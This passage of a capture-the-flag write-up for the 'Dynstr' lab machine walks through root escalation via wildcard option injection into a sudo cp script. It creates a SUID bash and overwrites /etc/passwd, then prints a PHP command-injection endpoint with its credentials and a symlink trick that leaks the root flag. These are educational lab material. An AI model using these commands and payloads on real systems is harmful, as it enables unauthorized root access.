    # *** TODO *** Uncomment restart once we are live.
    # systemctl restart bind9
    if [[ $? -ne 0 ]] ; then
        echo "[-] Restart of bind9 via systemctl failed. Please check logfile: "
        systemctl status bind9
    else
        echo "[+] Restart of bind9 via systemctl succeeded."
    fi
fi

```

### Wildcard Exploit

#### Strategy

The vulnerable line is this:

```

cp .version * /etc/bind/named.bindmgr/

```

It allows me to write any file I want into that directory owned as root. That on it’s own is not bad. But because of how Bash handles wildcards, if I create a file that looks like an option for `cp`, it will expand into place and be applied to that `cp`.

#### –preserve

Looking at the `cp` [man page](https://linux.die.net/man/1/cp), the `--preserve` option is interesting:

> **–preserve**[=*ATTR\_LIST*]
>
> preserve the specified attributes (default: mode,ownership,timestamps), if possible additional attributes: context, links, xattr, all

I don’t want to preserver ownership or timestamp, but preserving mode would allow me to create a SUID binary and then have it owned by root.

I’ll work out of `/dev/shm`, and first, create a version file to get past that check:

```

bindmgr@dynstr:/dev/shm$ echo 100 > .version

bindmgr@dynstr:/dev/shm$ sudo bindmgr.sh 
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /dev/shm.
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
cp: cannot stat '*': No such file or directory
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors: 
    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/*: file not found

```

It errors out because there are no files. I’ll create two. First, I’ll copy `bash` in and set it SUID. Then, I’ll `touch -- --preserve=mode`.

```

bindmgr@dynstr:/dev/shm$ cp /bin/bash .
bindmgr@dynstr:/dev/shm$ chmod 4777 bash 
bindmgr@dynstr:/dev/shm$ touch -- --preserve=mode

```

I’ll run `sudo bindmgr.sh`, and the script fails at the config check, but the SUID `bash` is now there:

```

bindmgr@dynstr:/dev/shm$ sudo bindmgr.sh 
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /dev/shm.
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors: 
    /etc/bind/named.bindmgr/bash:1: unknown option 'ELF...'
    /etc/bind/named.bindmgr/bash:14: unknown option 'hȀE'
    /etc/bind/named.bindmgr/bash:40: unknown option 'YF'
    /etc/bind/named.bindmgr/bash:40: unexpected token near '}'

bindmgr@dynstr:/dev/shm$ ls -l /etc/bind/named.bindmgr/
total 1156
-rwsrwxrwx 1 root bind 1183448 Jun 13 22:49 bash

```

Running it (with `-p` to avoid dropping privs) gives a root shell:

```

bindmgr@dynstr:/dev/shm$ /etc/bind/named.bindmgr/bash -p
bash-5.0# 

```

And the flag:

```

bash-5.0# cat /root/root.txt
5dd46220************************

```

#### –target-directory

The `--target-directory` flag is also a way to get root. My first thought was to write an SSH key to `/root/.ssh`, but that didn’t work (turns out that `/root/.ssh` doesn’t exist). Still, I can overwrite `/etc/passwd`. I’ll need four files.

First I need a modified copy of the `passwd` file with my user included:

```

bindmgr@dynstr:/tmp/tmp.fyyGsVJY8c$ cd $(mktemp -d)
bindmgr@dynstr:/tmp/tmp.Fk4IdAaCre$ cp /etc/passwd .
bindmgr@dynstr:/tmp/tmp.Fk4IdAaCre$ openssl passwd -1 0xdf
$1$KLTiIosS$EcdrRFwOKrCmloQFSZ2zn1
bindmgr@dynstr:/tmp/tmp.Fk4IdAaCre$ echo 'oxdf:$1$KLTiIosS$EcdrRFwOKrCmloQFSZ2zn1:0:0:pwned:/root:/bin/bash' >> passwd

```

The oxdf user is now uid and gid 0, which makes it root. And while passwords are typically hashed and stored in `/etc/shadow`, they are still handled find from the `passwd` file.

Second, I need a `.version` file:

```

bindmgr@dynstr:/tmp/tmp.Fk4IdAaCre$ echo 1000 > .version

```

Third, I need the `--target-directory` flag as a file:

```

bindmgr@dynstr:/tmp/tmp.Fk4IdAaCre$ touch -- --target-directory=etc

```

Were I using this flag in a legit `cp` command, I would just say `--target-directory=/etc`, but since I’m injecting it as a filename, and filenames can’t include `/`, I’ll have to point to `etc` in the local directory.

The forth file is a simlink from `./etc` to `/etc`:

```

bindmgr@dynstr:/tmp/tmp.Fk4IdAaCre$ ln -s /etc

```

That leaves the directory like:

```

bindmgr@dynstr:/tmp/tmp.Fk4IdAaCre$ ls -la
total 16
drwx------  2 bindmgr bindmgr 4096 Jun 13 23:29  .
drwxrwxrwt 17 root    root    4096 Jun 13 23:27  ..
lrwxrwxrwx  1 bindmgr bindmgr    4 Jun 13 23:29  etc -> /etc
-rw-r--r--  1 bindmgr bindmgr 1698 Jun 13 23:28  passwd
-rw-rw-r--  1 bindmgr bindmgr    0 Jun 13 23:29 '--target-directory=etc'
-rw-rw-r--  1 bindmgr bindmgr    5 Jun 13 23:29  .version

```

Now I’ll run the script:

```

bindmgr@dynstr:/tmp/tmp.Fk4IdAaCre$ sudo bindmgr.sh 
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/tmp.Fk4IdAaCre.
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
cp: -r not specified; omitting directory 'etc'
cp: -r not specified; omitting directory '/etc/bind/named.bindmgr/'
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors: 
    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/etc: file not found

```

The user is now in `/etc/passwd`:

```

bindmgr@dynstr:/tmp/tmp.Fk4IdAaCre$ tail -1 /etc/passwd
oxdf:$1$KLTiIosS$EcdrRFwOKrCmloQFSZ2zn1:0:0:pwned:/root:/bin/bash

```

Running `su` and entering the password returns a root shell:

```

bindmgr@dynstr:/tmp/tmp.Fk4IdAaCre$ su - oxdf
Password: 
root@dynstr:~# 

```

## Beyond Root

### no-ip API

The webserver is very simple on this box. There’s a static `index.html` page at the root, with the `assets` directory containing style and images:

```

www-data@dynstr:/var/www/html$ ls
assets  attribution.txt  index.html  nic
www-data@dynstr:/var/www/html$ find nic/ -type f -ls
   285028      0 -rw-r--r--   1 root     root            0 Mar 12 19:41 nic/index.html
   285029      4 -rw-r--r--   1 root     root         1110 Mar 13 19:40 nic/update

```

The `nic` directory has an empty `index.html` and the `update` path. `update` is actually PHP:

```

<?php
  // Check authentication
  if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']))      { echo "badauth\n"; exit; }
  if ($_SERVER['PHP_AUTH_USER'].":".$_SERVER['PHP_AUTH_PW']!=='dynadns:sndanyd') { echo "badauth\n"; exit; }

  // Set $myip from GET, defaulting to REMOTE_ADDR
  $myip = $_SERVER['REMOTE_ADDR'];
  if ($valid=filter_var($_GET['myip'],FILTER_VALIDATE_IP))                       { $myip = $valid; }

...[snip]...

```

This program first checks for the default cred pair, and exits if there’s no auth. It sets `$myip` to the remove server, and then if the `myip` GET parameter is a valid IP, it replaces it with that.

Next it checks for a `hostname` GET parameter, and it it’s not there, it returns `nochg $myip\n`:

```

...[snip]...
  if(isset($_GET['hostname'])) {
...[snip]...
  } else {
    echo "nochg $myip\n";
  }
?>

```

Now it’s going to validate `hostname`:

```

...[snip]...
    // Check for a valid domain
    list($h,$d) = explode(".",$_GET['hostname'],2);
    $validds = array('dnsalias.htb','dynamicdns.htb','no-ip.htb');
    if(!in_array($d,$validds)) { echo "911 [wrngdom: $d]\n"; exit; }
...[snip]...

```

`explode` in PHP is like split in Python. It breaks the `hostname` into two pieces based at the first `.`, and stores the first part as `$h` and the back part as `$d` (presumably for host and domain). If `$d` isn’t in the list, it returns `wrngdom`.

If the domain is ok, it continues and builds a string of `nsupdate` commands which are then pipped into `nsupdate` using `echo` inside `system`:

```

...[snip]...
    // Update DNS entry
    $cmd = sprintf("server 127.0.0.1\nzone %s\nupdate delete %s.%s\nupdate add %s.%s 30 IN A %s\nsend\n",$d,$h,$d,$h,$d,$myip);
    system('echo "'.$cmd.'" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key',$retval);
    // Return good or 911
    if (!$retval) {
      echo "good $myip\n";
    } else {
      echo "911 [nsupdate failed]\n"; exit;
    }
...[snip]...

```

The command injection is in `$h`, which is put into the `$cmd` twice, thus explaining why I got two pings. For example, the `whoami` payload I used was `$(whoami).no-ip.htb`. That would make the following pass to `nsupdate`:

```

server 127.0.0.1
zone no-ip.htb
update delete $(whoami).no-ip-htb
update add $(whoami).no-ip-htb 30 IN A 10.10.14.8
send

```

That explains why it runs twice.

### Alternative Root via Flag Leak

#### Method

The version check in `bindmgr.sh` looks like:

```

if [[ ! -f .version ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 42
fi
if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 43
fi

```

`-f` checks if the file is a regular file and it exists. That author intended that check to ensure that `.version` wasn’t a symlink. However, from the [Bash Conditional Expressions docs](https://www.gnu.org/software/bash/manual/html_node/Bash-Conditional-Expressions.html):

> Unless otherwise specified, primaries that operate on files follow symbolic links and operate on the target of the link, rather than the link itself.

`-h` or `-L` would have been appropriate choices here.

As long as the file points to a valid file that exists and is readable by root, then it will pass that check. What happens if I symlink `.version` to `root.txt`? It will then try to compare the contents to the `.version` file in `/etc/bind/named.bindmgr`.

I’ll drop into a new temp directory and try:

```

bindmgr@dynstr:/dev/shm$ cd $(mktemp -d)
bindmgr@dynstr:/tmp/tmp.3gN0fV4V9D$ ln -s /root/root.txt .version
bindmgr@dynstr:/tmp/tmp.3gN0fV4V9D$ sudo bindmgr.sh 
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/tmp.3gN0fV4V9D.
/usr/local/bin/bindmgr.sh: line 28: [[: 5dd462205002e72de695163969729020: value too great for base (error token is "5dd462205002e72de695163969729020")
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
cp: cannot stat '*': No such file or directory
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors: 
    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/*: file not found

```

It doesn’t like comparing the flag to a number, and prints the flag in the error message. When InfoSecJack got first blood, this was the technique he used.

Similarly, shortcutting `named-checkconf` to the flag will print all but the last two characters in it’s error message:

```

bindmgr@dynstr:/tmp$ cd $(mktemp -d)
bindmgr@dynstr:/tmp/tmp.TTFzU6A8E7$ echo 1000 > .version
bindmgr@dynstr:/tmp/tmp.TTFzU6A8E7$ ln -s /root/root.txt named-checkconf
bindmgr@dynstr:/tmp/tmp.TTFzU6A8E7$ sudo bindmgr.sh 
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/tmp.TTFzU6A8E7.
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors: 
    /etc/bind/named.bindmgr/named-checkconf:1: unknown option '5dd462205002e72de6951639697290...'
    /etc/bind/named.conf.bindmgr:3: unexpected token near end of file

```

#### More Than You Even Wanted To Know About Bash Number Comparisons

You have to get a bit lucky for this one to work, as it won’t display for all flags. When I originally solved this, the leak worked, and I got the notes from just above. When verifying it months later for this post, it didn’t and that’s because the newly random `root.txt` started with `f`. The flag needs to start with a digit for this path.

I’ll use a dummy command on my local console that’s the same check from Dynstr:

```

oxdf@parrot$ if [[ "1001" -le "1000" ]]; then echo "less"; else echo "more"; fi
more

```

If “1001” is less than “1000”, it’ll print “less”, else it’ll print “more”. In this case, as 1001 is greater than 1000, it prints “more”.

To map this to Dynstr, the first string would be what’s in the local `.version` and the second is what’s in the master version.

If I go to 999 for the first one, it prints less:

```

oxdf@parrot$ if [[ "999" -le "1000" ]]; then echo "less"; else echo "more"; fi
less

```

All as expected so far.

There’s two issues that come into play. First, Bash will handle numbers up to signed 64-bit integers, as this [StackOverflow post](https://superuser.com/questions/1030122/what-is-the-maximum-value-of-a-numeric-bash-shell-variable) demonstrates. I’ll show a subset of it here as well:

```

oxdf@parrot$ ((X=(2**63)-1)); echo $X
9223372036854775807
oxdf@parrot$ ((X++)); echo $X
-9223372036854775808

```

The largest number that Bash is holding in a variable on my system is 263-1. One more than that rolls around to the most negative number that fits in a two’s complement 64-bit signed int.

So when I put a 128 bit number in (the MD5 hash from `root.txt`), it’s not necessarily going to behave as expected. For example, if the hash were all 9s, it prints “less”, not “more”:

```

oxdf@parrot$ if [[ "99999999999999999999999999999999" -le "1000" ]]; then echo "less"; else echo "more"; fi
less

```

That’s because it is actually rolling over into a negative number:

```

oxdf@parrot$ ((X=99999999999999999999999999999999)); echo $X
-8814407033341083649

```

The other issue comes into plan when I add a non-digit to the string, like one of the hex characters in the MD5 hash:

```

oxdf@parrot$ if [[ "999999999999999999a9999999999999" -le "1000" ]]; then echo "less"; else echo "more"; fi
-bash: [[: 999999999999999999a9999999999999: value too great for base (error token is "999999999999999999a9999999999999")
more

```

The base in this case is 10, and therefore the “a” is “too great for the base”. That’s what prints the message.

However, if the first digit is a character, for some reason, Bash makes the entire value 0:

```

oxdf@parrot$ ((X=a999999999a9e9999999999999c99999)); echo $X
0

```

So the comparison goes off without an issue:

```

oxdf@parrot$ if [[ "a99999999999999999a9999999999999" -le "1000" ]]; then echo "less"; else echo "more"; fi
less

```

The flag leak occurs in the error message when there’s a character in the hash, but not the first character.

Some quick math to find out how often this will work:

All MD5 hashes: 1632 = 340282366920938463463374607431768211456

MD5 hashes all digits: 1032 = 100000000000000000000000000000000

MD5 hashes that start with a character: 1631 \* 6 = 127605887595351923798765477786913079296

Because the two sets that don’t work don’t overlap (if it’s all digits, it can’t start with a character), I can add those together and divide by the total and get the percentage of the time it won’t work, which is about 37.5% of randomly generated flags. That means for 62.5% of flags, it will work.

It turns out that the chance of getting a hash with no characters in it are so small (0.00003%), it’s not really important to the calculation.